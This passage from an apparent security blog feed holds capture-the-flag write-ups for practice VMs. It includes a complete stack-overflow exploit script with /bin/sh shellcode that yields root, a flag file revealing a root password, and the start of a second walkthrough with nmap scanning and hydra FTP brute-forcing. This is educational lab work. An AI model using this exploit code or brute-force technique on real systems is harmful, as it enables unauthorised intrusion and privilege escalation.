</span><span class='line'>EDX: 0x9 <span class="o">(</span><span class="s1">&#39;\t&#39;</span><span class="o">)</span>
</span><span class='line'>ESI: 0x0
</span><span class='line'>EDI: 0x0
</span><span class='line'>EBP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>ESP: 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>EIP: 0x41414141 <span class="o">(</span><span class="s1">&#39;AAAA&#39;</span><span class="o">)</span>
</span><span class='line'>EFLAGS: 0x10286 <span class="o">(</span>carry PARITY adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
</span><span class='line'><span class="o">[</span>-------------------------------------code-------------------------------------<span class="o">]</span>
</span><span class='line'>Invalid <span class="nv">$PC</span> address: 0x41414141
</span><span class='line'><span class="o">[</span>------------------------------------stack-------------------------------------<span class="o">]</span>
</span><span class='line'>0000<span class="p">|</span> 0xbffff3d0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0004<span class="p">|</span> 0xbffff3d4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0008<span class="p">|</span> 0xbffff3d8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0012<span class="p">|</span> 0xbffff3dc <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0016<span class="p">|</span> 0xbffff3e0 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0020<span class="p">|</span> 0xbffff3e4 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0024<span class="p">|</span> 0xbffff3e8 <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'>0028<span class="p">|</span> 0xbffff3ec <span class="o">(</span><span class="s1">&#39;A&#39;</span> &lt;repeats 200 <span class="nb">times</span>&gt;...<span class="o">)</span>
</span><span class='line'><span class="o">[</span>------------------------------------------------------------------------------<span class="o">]</span>
</span><span class='line'>Legend: code, data, rodata, value
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x41414141 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>BOOM!</strong> A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up <code>pattern_create</code> from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 <em>A</em>&rsquo;s to this pattern and rerun the crash in <code>gdb</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# python make-crypt.py &gt; crash.tfc
</span><span class='line'>
</span><span class='line'>root@kali:~# gdb -q ./tfc
</span><span class='line'>Reading symbols from /root/tfc...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>r crash.tfc crash-out.tfc
</span><span class='line'>
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Stopped reason: SIGSEGV
</span><span class='line'>0x35684634 in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the crash at <code>0x35684634</code>, we check up with <code>pattern_offset</code> to see where exactly in that 6000 character buffer this pattern occurs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Exact match at offset 4124
</span></code></pre></td></tr></table></div></figure>


<p>This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 <em>A</em>&rsquo;s and then 4 <em>B</em>&rsquo;s, and padded the rest with <em>C</em>&rsquo;s up to 6000 characters.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;BBBB&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This resulted in a crash at <code>0x42424242</code> in <code>gdb</code> which was perfect!</p>

<h2>exploiting tfc</h2>

<p>The only thing that was left to do was to find a <code>JMP ESP</code> instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with <code>NO NX</code>, it should happily execute code on it.</p>

<p><img src="https://i.imgur.com/Mqkfe8l.png"></p>

<p>Using Evans Debugger (run with <code>edb --run ./tfc</code>), I searched for a <em>JMP ESP</em> instruction and found one in <code>tfc</code> itself at <code>0x08048e93</code>. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">content</span> <span class="o">=</span> <span class="s2">&quot;A&quot;</span> *4124 + <span class="s2">&quot;\x93\x8e\x04\x08&quot;</span> + <span class="s2">&quot;C&quot;</span>*<span class="o">(</span>6000-4124-4<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>Lastly, we need some shell code. I just re-used some <code>/bin/sh</code> shell code I have stashed away for this one, and added it to the buffer after a few NOP&rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>
</span><span class='line'>    <span class="c"># 08048e93  ; jmp esp</span>
</span><span class='line'>    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68</span><span class="s">&quot;</span> <span class="o">+</span>
</span><span class='line'>        <span class="s">&quot;</span><span class="se">\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">content</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span><span class="mi">4124</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x93\x8e\x04\x08</span><span class="s">&quot;</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">&quot;C&quot;</span> <span class="o">*</span><span class="p">(</span><span class="mi">6000</span><span class="o">-</span><span class="mi">4124</span><span class="o">-</span><span class="mi">4</span><span class="o">-</span><span class="mi">16</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
</span><span class='line'>    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">encrypted</span> <span class="o">=</span> <span class="n">xcrypt</span><span class="p">(</span><span class="n">content</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="n">encrypted</span>
</span></code></pre></td></tr></table></div></figure>


<p>With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to <code>jason</code>&rsquo;s home directory and executed it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>jason@knockknock:~<span class="nv">$ </span>python make-crypt.py &gt; crash.tfc <span class="o">&amp;&amp;</span> ./tfc crash.tfc crash-out.tfc
</span><span class='line'><span class="c"># id</span>
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jason<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,1000<span class="o">(</span>jason<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>pwnd!</p>

<p>As proof, the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt</span>
</span><span class='line'> __                         __              __                         __      ____
</span><span class='line'><span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __         <span class="p">|</span>  <span class="p">|</span> __ ____   ____   ____ <span class="p">|</span>  <span class="p">|</span> __ /_   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  ______ <span class="p">|</span>  <span class="p">|</span>/ //    <span class="se">\ </span>/  _ <span class="se">\_</span>/ ___<span class="se">\|</span>  <span class="p">|</span>/ /  <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;  /_____/ <span class="p">|</span>    &lt;<span class="p">|</span>   <span class="p">|</span>  <span class="o">(</span>  &lt;_&gt; <span class="o">)</span>  <span class="se">\_</span>__<span class="p">|</span>    &lt;   <span class="p">|</span>   <span class="p">|</span>
</span><span class='line'><span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span>        <span class="p">|</span>__<span class="p">|</span>_ <span class="se">\_</span>__<span class="p">|</span>  /<span class="se">\_</span>___/ <span class="se">\_</span>__  &gt;__<span class="p">|</span>_ <span class="se">\ </span> <span class="p">|</span>___<span class="p">|</span>
</span><span class='line'>     <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>              <span class="se">\/</span>    <span class="se">\/</span>            <span class="se">\/</span>     <span class="se">\/</span>
</span><span class='line'>
</span><span class='line'>Hooray you got the flag!
</span><span class='line'>
</span><span class='line'>Hope you had as much fun r00ting this as I did making it!
</span><span class='line'>
</span><span class='line'>Feel free to hit me up in <span class="c">#vulnhub @ zer0w1re</span>
</span><span class='line'>
</span><span class='line'>Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
</span><span class='line'>as well as rasta_mouse, and recrudesce <span class="k">for </span>helping to find bugs and <span class="nb">test </span>the VM :<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>root password is <span class="s2">&quot;qVx4UJ*zcUdc9#3C$Q&quot;</span>, but you should already have a shell, right? <span class="p">;</span><span class="o">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>There are a number other goodies in /root to check out so be sure to do that!</p>

<h2>conclusion</h2>

<p>Big shoutout to <a href="https://twitter.com/zer0w1re">@zer0w1re</a> for the VM and as always <a href="https://twitter.com/vulnhub">@VulnHub</a> for the hosting. The learning experience has been invaluable! :)</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[another troll tamed - solving troll 2]]></title>
    <link href="http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/"/>
    <updated>2014-10-10T17:32:35+02:00</updated>
    <id>http://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2</id>
    <content type="html"><![CDATA[<h2>foreword</h2>

<p><a href="">Tr0ll2</a> is a successor in a boot2root series by <a href="https://twitter.com/Maleus21">@Maleus21</a> hosted over at <a href="http://vulnhub.com/">VulnHub</a>. Having been able to <a href="https://leonjza.github.io/blog/2014/08/15/taming-the-troll/">pwn Tr0ll1</a>, I gave this one a shot too.</p>

<p>Here is my experience taming the troll, again.</p>

<!--more-->


<h2>getting started</h2>

<p>Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a <code>nmap</code> against it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-10-10 06:55 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.101
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.00031s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 997 filtered ports
</span><span class='line'>Reason: 997 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'>Service Info: Host: Tr0ll<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 15.21 seconds
</span></code></pre></td></tr></table></div></figure>


<p>ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for <em>vsftpd 2.0.8 exploit</em> with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&rsquo;t any strange banners etc to be found which was not the case.</p>

<h2>web server</h2>

<p>Opening up a browser to <a href="http://192.168.56.101">http://192.168.56.101</a> revealed a familiar image:</p>

<p><img src="https://i.imgur.com/7lyyzPS.png">
Oh. Hai. The sources serving up the image had the comment <code>&lt;!-- Nothing to see here, but good try NOOB!&gt;</code> with the image.</p>

<p>Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>/keep_trying
</span><span class='line'>/dont_bother
</span><span class='line'>/noob
</span><span class='line'>/ok_this_is_it
</span></code></pre></td></tr></table></div></figure>


<p>The content served up at these URLs:</p>

<p><img src="https://i.imgur.com/yH4vTKx.png"></p>

<p>The source that serves up this image had the comment <code>&lt;!--What did you really think to find here? Try Harder!&gt;</code> with the image.</p>

<p>So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&rsquo;s that would 200 into a text file from the <code>robots.txt</code> and looped over them downloading the images:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# <span class="k">for </span>line in <span class="k">$(</span>cat 200.txt<span class="k">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="s2">&quot;==&gt;$line&lt;==&quot;</span> <span class="o">&amp;&amp;</span> wget 192.168.56.101/<span class="nv">$line</span>/cat_the_troll.jpg<span class="p">;</span> <span class="k">done</span>
</span><span class='line'>
</span><span class='line'><span class="o">==</span>&gt;/ok_this_is_it&lt;<span class="o">==</span>
</span><span class='line'>--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
</span><span class='line'>Connecting to 192.168.56.101:80... connected.
</span><span class='line'>HTTP request sent, awaiting response... 200 OK
</span><span class='line'>Length: 15831 <span class="o">(</span>15K<span class="o">)</span> <span class="o">[</span>image/jpeg<span class="o">]</span>
</span><span class='line'>Saving to: <span class="sb">`</span>cat_the_troll.jpg.3<span class="s1">&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s1">100%[=======&gt;] 15,831      --.-K/s   in 0s      </span>
</span><span class='line'>
</span><span class='line'><span class="s1">2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39;</span> saved <span class="o">[</span>15831/15831<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>Immediately when you <code>ls</code> the directory containing the images will you notice a difference:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# ls -l
</span><span class='line'>total 68
</span><span class='line'>-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
</span><span class='line'>-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 <span class="c">#&lt;---</span>
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
</span><span class='line'>-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
</span></code></pre></td></tr></table></div></figure>


<p>One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a <code>cmp</code> on the files hinted towards what may be up.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
</span><span class='line'>cmp: EOF on cat_the_troll.jpg
</span></code></pre></td></tr></table></div></figure>


<p>Sweet, so lets print the last line of both and check what the diff is:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
</span><span class='line'>8�z2��p�T�lj<span class="se">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E<span class="nv">$�</span>��%<span class="o">=</span>���.�B���o�ES_�
</span><span class='line'>
</span><span class='line'>root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
</span><span class='line'>8�z2��p�T�lj<span class="se">\p</span>��?�&lt;�S�۪��6�#���7U y���*/ p?E<span class="nv">$�</span>��%<span class="o">=</span>���.�B���o�ES_��Look Deep within y0ur_self <span class="k">for </span>the answer
</span></code></pre></td></tr></table></div></figure>


<p><em>Look Deep within y0ur_self for the answer</em>. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words <em>y0ur_self</em> were written differently, I tried to use this as a web path:</p>

<p><img src="https://i.imgur.com/oNInvrf.png"></p>

<p>I downloaded <code>answer.txt</code> and started to check what is happening inside:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# head answer.txt
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'><span class="nv">QQo</span><span class="o">=</span>
</span><span class='line'>QUEK
</span><span class='line'>QUIK
</span><span class='line'><span class="nv">QUJNCg</span><span class="o">==</span>
</span><span class='line'>QUMK
</span><span class='line'><span class="nv">QUNUSAo</span><span class="o">=</span>
</span><span class='line'>QUkK
</span><span class='line'><span class="nv">QUlEUwo</span><span class="o">=</span>
</span><span class='line'>QU0K
</span></code></pre></td></tr></table></div></figure>


<p>Looks a lot like base64 hey? Lets try decode it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# cat answer.txt <span class="p">|</span> base64 -d <span class="p">|</span> head
</span><span class='line'>A
</span><span class='line'>A
</span><span class='line'>AA
</span><span class='line'>AB
</span><span class='line'>ABM
</span><span class='line'>AC
</span><span class='line'>ACTH
</span><span class='line'>AI
</span><span class='line'>AIDS
</span><span class='line'>AM
</span></code></pre></td></tr></table></div></figure>


<p>The resultant output appeared to be a wordlist. A big one too. In fact, it has <strong>99157</strong> entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a <code>sort | uniq</code>, the size was reduced to <strong>73128</strong> which was still too much.</p>

<p>I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry <strong>ItCantReallyBeThisEasyRightLOL</strong> on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P</p>

<p>My guess was that this has to be a password for either the FTP or SSH service.</p>

<h2>ftpee</h2>

<p>I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.</p>

<p>As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in <code>answer.txt</code>, mutate it a bit and hand it over to hydra to do its work.</p>

<p>My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran <code>cat wordz |  tr "\"' " '\n' | sort -u &gt;&gt; words</code> to break it up into a wordlist. Lastly I took the entries had a <code>_</code> in them and broke them up as single words ie: <code>cat_the_troll.jpg</code> turned into <code>cat</code>, <code>the</code>, <code>troll</code>. The resultant list can be seen <a href="https://gist.github.com/leonjza/db5cc19cd62b270a89db">here</a></p>

<p>And finally, it was time to let hydra on the loose.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
</span><span class='line'>Hydra v7.6 <span class="o">(</span>c<span class="o">)</span>2013 by van Hauser/THC <span class="p">&amp;</span> David Maciejak - <span class="k">for </span>legal purposes only
</span><span class='line'>
</span><span class='line'>Hydra <span class="o">(</span>http://www.thc.org/thc-hydra<span class="o">)</span> starting at 2014-10-10 08:11:50
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> 30 tasks, 1 server, 13689 login tries <span class="o">(</span>l:117/p:117<span class="o">)</span>, ~456 tries per task
</span><span class='line'><span class="o">[</span>DATA<span class="o">]</span> attacking service ftp on port 21
</span><span class='line'><span class="o">[</span>VERBOSE<span class="o">]</span> Resolving addresses ... <span class="k">done</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;&gt;&quot;</span> - 1 of 13689 <span class="o">[</span>child 0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;404&quot;</span> - 2 of 13689 <span class="o">[</span>child 1<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;again&quot;</span> - 3 of 13689 <span class="o">[</span>child 2<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;&gt;&quot;</span> - pass <span class="s2">&quot;agent&quot;</span> - 4 of 13689 <span class="o">[</span>child 3<span class="o">]</span>
</span><span class='line'><span class="o">[</span>...<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;Tr0ll&quot;</span> - 10621 of 13689 <span class="o">[</span>child 4<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ATTEMPT<span class="o">]</span> target 192.168.56.101 - login <span class="s2">&quot;Tr0ll&quot;</span> - pass <span class="s2">&quot;tr0ll2&quot;</span> - 10622 of 13689 <span class="o">[</span>child 8<span class="o">]</span>
